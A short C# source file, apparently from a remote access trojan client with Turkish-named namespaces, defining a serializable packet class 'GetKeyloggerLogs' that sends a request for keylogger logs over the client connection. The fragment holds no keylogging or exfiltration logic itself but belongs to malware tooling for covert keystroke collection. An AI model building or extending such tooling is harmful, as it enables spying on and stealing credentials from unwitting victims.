using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class GetKeyloggerLogs : IPacket
    {
        public GetKeyloggerLogs() { }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}